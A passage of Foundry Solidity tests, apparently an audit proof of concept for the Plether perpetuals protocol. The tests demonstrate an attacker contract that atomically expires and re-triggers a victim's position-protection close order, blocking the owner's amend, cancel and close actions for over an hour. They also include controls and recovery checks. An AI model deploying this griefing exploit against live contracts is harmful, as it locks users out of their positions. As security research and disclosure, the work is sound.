            g.ownerManualExecution = _p01CostedExecuteManualAlreadyAtHead(manualId);
            // The owner has to clear the older FIFO retry first. The V3 manual
            // commit probe itself is OPTIONAL and excluded from required gas.
            r.ownerRecoveryGas = g.ownerBadRetryExecution + g.ownerManualExecution;
        } else {
            g.ownerBadRetryExecution = _p01CostedEarlyTerminal(badRetry);
            _p01AssertState(protectionId, PositionProtectionTypes.PositionProtectionStatus.Latched, 0);
            g.ownerAmend = _p01CostedAmend(protectionId);
            g.ownerSuccessfulExecution = _p01CostedSuccessfulExecution(protectionId);
            r.ownerRecoveryGas = g.ownerBadRetryExecution + g.ownerAmend + g.ownerSuccessfulExecution;
        }

        r.ownerFrontRunRevertGas = g.ownerFailedAmend;
        r.optionalManualProbeGas = g.ownerManualCommitAttempt;
        r.bobGas = g.bobInitialRetry;
        r.manualCommitAllowed = g.directManualCloseCommitted;
        r.aliceSettlementEnd = clearinghouse.balanceAssets(ALICE);
        emit log_named_uint("P01 Bob retry call gas proxy", g.bobInitialRetry);
        emit log_named_uint("P01 owner failing amend gas proxy", g.ownerFailedAmend);
        emit log_named_uint("P01 owner failed manual commit gas proxy", g.ownerManualCommitAttempt);
        emit log_named_uint("P01 owner early bad-order execution gas proxy", g.ownerBadRetryExecution);
        emit log_named_uint("P01 owner manual successful execution gas proxy", g.ownerManualExecution);
        (uint256 remaining,,,,,,) = engine.positions(ALICE);
        assertEq(remaining, 0, "P01 Alice independently recovers in attacked branch");
        assertEq(router.pendingOrderCounts(ALICE), 0, "P01 no pending orders after recovery");
        assertEq(protectionViews.activePositionProtectionId(ALICE), 0, "P01 protection releases");
    }

    // SAME-INITIAL-STATE DIFFERENTIAL + ALTERNATE RECOVERY FALSIFIER.
    // Control: Alice fixes old limits, then completes the close through Router.
    // Attack: Bob retries with old limits first, Alice's attempted amendment
    // reverts, then we TRY the production manual-close path. If unavailable,
    // Alice executes Bob's bad retry, amends and closes, without time expiry.
    // Gas is a measured EVM-call proxy (not a wei loss / not a promised Pyth fee).
    function test_P01_03_SameStateVictimGasAndActualManualClose() public {
        _startRecordingLogs();
        uint64 protectionId = _p01CreateLatched();
        uint256 baselineSnapshot = vm.snapshotState();
        P01BenchResult memory control = _p01BenchmarkOwnerFirst(protectionId);

        bool restored = vm.revertToState(baselineSnapshot);
        assertTrue(restored, "P01 same-state differential snapshot restored");
        _p01AssertState(protectionId, PositionProtectionTypes.PositionProtectionStatus.Latched, 0);
        (uint256 liveSize,,,,,,) = engine.positions(ALICE);
        assertEq(liveSize, POSITION_SIZE, "P01 starting position matches control");

        P01BenchResult memory attacked = _p01BenchmarkBobFirst(protectionId);
        emit log_named_uint("P01 control minimum owner recovery gas proxy", control.ownerRecoveryGas);
        emit log_named_uint("P01 attack minimum owner recovery gas proxy", attacked.ownerRecoveryGas);
        emit log_named_uint("P01 Bob attacker gas proxy", attacked.bobGas);
        emit log_named_uint("P01 owner direct manual close admitted", attacked.manualCommitAllowed ? 1 : 0);
        emit log_named_uint("P01 control final Alice settlement", control.aliceSettlementEnd);
        emit log_named_uint("P01 attack final Alice settlement", attacked.aliceSettlementEnd);
        emit log_named_uint("P01 minimum additional recovery gas proxy", attacked.ownerRecoveryGas > control.ownerRecoveryGas ? attacked.ownerRecoveryGas - control.ownerRecoveryGas : 0);
        emit log_named_uint("P01 additional front-run reverting amendment gas proxy", attacked.ownerFrontRunRevertGas);
        emit log_named_uint("P01 optional manual-close probe gas excluded", attacked.optionalManualProbeGas);
        emit log_named_uint("P01 recovery cost parity or cheaper after attack", attacked.ownerRecoveryGas <= control.ownerRecoveryGas ? 1 : 0);
        // No fake assertion of real-world ETH loss. Each branch executes in
        // one Foundry test; transaction inclusion and Pyth update fees are
        // not modeled by the synthetic mock environment.
    }
}
```

### File 2 — `PletherProtectionAtomicRearmFinal.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Inherit the existing, previously compiled production-stack P-01 fixture and
// its proven owner-control/constraint-violation helpers. All public calls
// target unmodified Plether contracts at the pinned competition revision.
import {PletherProtectionRetryGriefV15} from "./PletherProtectionRetryGriefV15.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";

interface IP01PublicExpiry {
    function expireOrder(uint64 orderId) external returns (OrderV3Types.ExecutionResult memory result);
}
interface IP01PublicRetry {
    function retryPositionProtectionClose(uint64 protectionId) external returns (uint64 linkedOrderId);
}

/// @dev Real attacker-controlled EVM actor; no prank between expiry and retry.
/// Both public calls MUST succeed or the entire transaction rolls back.
contract P01AtomicRearmActor {
    function expireThenRetry(
        address routerAddress,
        address protectionBookAddress,
        uint64 oldAttemptId,
        uint64 protectionId
    ) external returns (uint64 nextAttemptId, OrderV3Types.ExecutionResult memory expired) {
        expired = IP01PublicExpiry(routerAddress).expireOrder(oldAttemptId);
        require(expired.status == OrderV3Types.LifecycleStatus.Failed, "P01: original not terminal");
        nextAttemptId = IP01PublicRetry(protectionBookAddress).retryPositionProtectionClose(protectionId);
    }
}

contract PletherProtectionAtomicRearmFinal is PletherProtectionRetryGriefV15 {
    uint256 private constant P01F_MIN_DURATION = 1 hours;
    P01AtomicRearmActor private rearmActor;

    // PositionProtectionTest.setUp() is not virtual. Inheriting it unchanged is
    // mandatory; deploy the attacker actor lazily before the prank instead.
    function _p01fEnsureActor() internal {
        if (address(rearmActor) == address(0)) {
            rearmActor = new P01AtomicRearmActor();
        }
    }

    function _p01fPendingRetry(uint64 protectionId) internal returns (uint64 attemptId) {
        vm.prank(BOB);
        attemptId = protectionActions.retryPositionProtectionClose(protectionId);
        _p01AssertState(protectionId, PositionProtectionTypes.PositionProtectionStatus.Triggered, 1);
        assertEq(_orderRecord(attemptId).executionBountyAssets, 0, "P01F: retry is zero-bounty");
    }

    function _p01fDeadline(uint64 attemptId) internal view returns (uint256) {
        return uint256(router.lifecycleBook().orderTiming(attemptId).executionDeadline);
    }

    function _p01fAdvancePastDeadline(uint64 attemptId) internal returns (uint256 nextTime) {
        uint256 deadline = _p01fDeadline(attemptId);
        assertGe(deadline, vm.getBlockTimestamp(), "P01F: pending child has not already expired");
        nextTime = deadline + 1;
        vm.warp(nextTime);
        vm.roll(block.number + 1);
        assertEq(vm.getBlockTimestamp(), nextTime, "P01F: timestamp cheatcode advanced correctly");
    }

    function _p01fAtomicCycle(uint64 oldId, uint64 protectionId)
        internal returns (uint64 newId, uint256 gasProxy)
    {
        _p01fEnsureActor();
        uint256 beforeGas = gasleft();
        vm.prank(BOB);
        OrderV3Types.ExecutionResult memory result;
        (newId, result) = rearmActor.expireThenRetry(
            address(router), address(protectionActions), oldId, protectionId
        );
        gasProxy = beforeGas - gasleft();
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "P01F: expiry finalizes old attempt");
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.Expired), "P01F: exact old-order terminal reason");
        assertGt(uint256(newId), uint256(oldId), "P01F: retry appends a fresh attempt");
        _p01AssertState(protectionId, PositionProtectionTypes.PositionProtectionStatus.Triggered, 1);
        assertEq(uint256(protectionViews.getPositionProtection(protectionId).linkedOrderId), uint256(newId), "P01F: latest child identity");
        assertEq(_orderRecord(newId).executionBountyAssets, 0, "P01F: new attempt has no bounty");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, POSITION_SIZE, "P01F: position remains open and owner-exposed");
    }

    function _p01fBlockedOwnerActions(uint64 protectionId) internal {
        _p01CostedFailedAmend(protectionId);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);

        // Construct the request BEFORE arming expectRevert, so read-only
        // request prerequisites cannot satisfy the expected-revert cheatcode.
        OrderV3Types.OrderRequest memory atomicExit = _manualCloseRequest(CfdTypes.Side.LONG);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtectionAndCommitClose(protectionId, atomicExit);

        OrderV3Types.OrderRequest memory directClose = _manualCloseRequest(CfdTypes.Side.LONG);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(directClose);
    }

    /// CONTROL/POSITIVE DIFFERENTIAL: exactly the same post-deadline state.
    /// Control allows an owner amendment after expiry; the attack atomically
    /// relatches before any other external transaction can be included.
    function test_P01F_01_AtomicExpiryRetryVsOwnerFirstControl() public {
        _startRecordingLogs();
        uint64 protectionId = _p01CreateLatched();
        uint64 oldAttempt = _p01fPendingRetry(protectionId);
        _p01fAdvancePastDeadline(oldAttempt);
        uint256 sameState = vm.snapshotState();

        vm.prank(BOB);
        OrderV3Types.ExecutionResult memory ctrlExpired = router.expireOrder(oldAttempt);
        assertEq(uint8(ctrlExpired.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        _p01AssertState(protectionId, PositionProtectionTypes.PositionProtectionStatus.Latched, 0);
        _p01OwnerAmends(protectionId);
        _p01OwnerExecutesAfterAmend(protectionId);
        emit log_named_uint("P01F owner-first control fully closed", 1);

        assertTrue(vm.revertToState(sameState), "P01F: return to identical expired-order state");
        uint64 nextId;
        uint256 attackGas;
        (nextId, attackGas) = _p01fAtomicCycle(oldAttempt, protectionId);
        _p01fBlockedOwnerActions(protectionId);
        emit log_named_uint("P01F attacker atomic expiry+retry gas proxy", attackGas);
        emit log_named_uint("P01F attacker new child", nextId);
        emit log_named_uint("P01F owner amendment/cancel/normal close blocked", 1);
    }

    /// DURATION/REARMING: no inter-transaction Latched state after any attacker
    /// transaction; 1h+ of conditional interference with no signed Pyth data.
    /// This does NOT prove the attacker controls sequencer ordering or that the
    /// victim cannot execute an unexecutable child early with valid Pyth data.
    function test_P01F_02_ContinuousAtomicRearmAcrossOneHour() public {
        _startRecordingLogs();
        uint64 protectionId = _p01CreateLatched();
        uint64 current = _p01fPendingRetry(protectionId);
        uint256 initialTime = vm.getBlockTimestamp();
        uint256 bobSettlementStart = clearinghouse.balanceAssets(BOB);
        uint256 aliceSettlementStart = clearinghouse.balanceAssets(ALICE);
        uint256 totalProxy;
        uint256 cycles;
        uint256 window = router.maxExecutionWindowSeconds();
        assertGt(window, 0, "P01F: configured execution window must be nonzero");
        uint256 maximumCycles = P01F_MIN_DURATION / window + 3;
        assertLe(maximumCycles, 90, "P01F: fixture needs more than 90 cycles");

        while (vm.getBlockTimestamp() - initialTime < P01F_MIN_DURATION) {
            _p01fAdvancePastDeadline(current);
            uint256 callGas;
            (current, callGas) = _p01fAtomicCycle(current, protectionId);
            totalProxy += callGas;
            ++cycles;
            assertLe(cycles, maximumCycles, "P01F: bounded loop unexpected duration");
            // A fresh EOA amendment at this post-transaction state fails.
            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _p01SafeLimits());
        }
        uint256 elapsed = vm.getBlockTimestamp() - initialTime;
        assertGe(elapsed, P01F_MIN_DURATION, "P01F: at least 1h simulated repeated attack state");
        assertEq(clearinghouse.balanceAssets(BOB), bobSettlementStart, "P01F: Bob spent no USDG on retries");
        assertEq(clearinghouse.balanceAssets(ALICE), aliceSettlementStart, "P01F: position did not silently close or transfer USDG");
        emit log_named_uint("P01F uninterrupted conditional lock elapsed seconds", elapsed);
        emit log_named_uint("P01F committed attacker cycles", cycles);
        emit log_named_uint("P01F total attacker call gas proxy", totalProxy);
        emit log_named_uint("P01F last active child", current);

        // Recovery falsifier: when Bob stops rearming, Alice can expire the
        // final bad child, amend and complete the legitimate close.
        _p01fAdvancePastDeadline(current);
        vm.prank(ALICE);
        router.expireOrder(current);
        _p01AssertState(protectionId, PositionProtectionTypes.PositionProtectionStatus.Latched, 0);
        _p01OwnerAmends(protectionId);
        _p01OwnerExecutesAfterAmend(protectionId);
        emit log_named_uint("P01F owner fully exits once attacker stops", 1);
    }

    /// EARLY EXIT FALSIFIER: even after an atomic attack, the owner or an
    /// independent keeper possessing fresh Pyth data can fail the bad order
    /// before its deadline. The owner still needs the subsequent amend tx.
    function test_P01F_03_FreshPythAllowsEarlyTerminalThenOwnerRecovery() public {
        _startRecordingLogs();
        uint64 protectionId = _p01CreateLatched();
        uint64 oldAttempt = _p01fPendingRetry(protectionId);
        _p01fAdvancePastDeadline(oldAttempt);
        uint256 sameState = vm.snapshotState();

        // Control: expire, amend, execute correct full close.
        vm.prank(BOB);
        router.expireOrder(oldAttempt);
        _p01OwnerAmends(protectionId);
        _p01OwnerExecutesAfterAmend(protectionId);
        uint256 ctrlAliceEnd = clearinghouse.balanceAssets(ALICE);
        emit log_named_uint("P01F owner-first final settlement", ctrlAliceEnd);

        assertTrue(vm.revertToState(sameState), "P01F: restore identical time/account state");
        (uint64 freshAttempt, uint256 attackerGas) = _p01fAtomicCycle(oldAttempt, protectionId);
        uint256 ownerEarlyExecutionGas = _p01CostedEarlyTerminal(freshAttempt);
        _p01AssertState(protectionId, PositionProtectionTypes.PositionProtectionStatus.Latched, 0);
        _p01OwnerAmends(protectionId);
        _p01OwnerExecutesAfterAmend(protectionId);
        uint256 attackedAliceEnd = clearinghouse.balanceAssets(ALICE);
        emit log_named_uint("P01F attacker atomic call gas proxy", attackerGas);
        emit log_named_uint("P01F owner extra bad-child terminal gas proxy", ownerEarlyExecutionGas);
        emit log_named_uint("P01F attacked final Alice settlement", attackedAliceEnd);
        emit log_named_uint("P01F owner eventually recovered with fresh Pyth", 1);
        // End balances may legitimately differ by time/index checkpoints; do
        // not make a false theft claim from unrelated carry accrued meanwhile.
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "P01F: actually closed after early recovery");
    }

    /// NEGATIVE CONTROL: the attacker contract must not bypass the genuine
    /// expiration deadline. A failure here invalidates the claimed scheduling.
    function test_P01F_04_AtomicPairCannotRunBeforeDeadline() public {
        uint64 protectionId = _p01CreateLatched();
        uint64 liveAttempt = _p01fPendingRetry(protectionId);
        uint256 deadline = _p01fDeadline(liveAttempt);
        assertLt(vm.getBlockTimestamp(), deadline, "P01F: initial attempt is unexpired");
        _p01fEnsureActor();
        vm.prank(BOB);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__OrderNotExpired.selector);
        rearmActor.expireThenRetry(address(router), address(protectionActions), liveAttempt, protectionId);
        _p01AssertState(protectionId, PositionProtectionTypes.PositionProtectionStatus.Triggered, 1);
        assertEq(protectionViews.getPositionProtection(protectionId).linkedOrderId, liveAttempt);
    }
}
```
